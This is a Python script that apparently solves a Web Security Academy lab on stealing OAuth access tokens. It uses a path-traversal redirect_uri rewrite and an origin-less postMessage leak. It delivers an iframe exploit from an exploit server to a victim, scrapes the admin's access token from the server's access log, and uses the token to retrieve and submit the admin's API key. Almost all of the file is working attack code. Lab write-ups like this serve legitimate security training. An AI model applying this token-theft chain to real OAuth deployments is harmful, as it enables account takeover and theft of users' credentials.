from web_security_academy.core.logger import logger
from web_security_academy.core.utils import read_file

from urllib.parse import urljoin
from jinja2 import Environment
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    # Explanation: The path "/post/comment/comment-form" contains JavaScript that
    # calls postMessage() on the parent window, passing in URL fragment data along
    # with form data. Since a target origin isn't specified, we can host an iframe
    # on the exploit server that starts an OAuth flow that ends with a redirection
    # to the comment form. The access token is included in the URL fragment, and is
    # ultimately sent to exploit page window.

    # Construct OAuth URL that redirects to comment form
    resp = session.get_path("/social-login")
    soup = BeautifulSoup(resp.text, "lxml")
    meta = soup.select_one('meta[http-equiv="refresh"]')
    oauth_url = meta.get("content")[6:]
    oauth_url = oauth_url.replace(
        "/oauth-callback",
        "/oauth-callback/../post/comment/comment-form",
    )

    # Send HTML / JavaScript payload to victim
    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    template = Environment().from_string(read_file("exploit.html").decode())
    body = template.render(url=urljoin(session.url, oauth_url))
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    # Extract the admin's access token from exploit server logs
    log = exploit_server.access_log()
    access_token = re.findall(r"/access_token=([^ ]+)", log)[-1]
    logger.info(f"Extracted access token: {access_token}")

    # Use access token to get the admin's API key
    headers = {"Authorization": f"Bearer {access_token}"}
    resp = session.get(urljoin(oauth_url, "/me"), headers=headers)
    api_key = resp.json()["apikey"]
    logger.info(f"Admin API key: {api_key}")
    session.submit_solution(api_key)
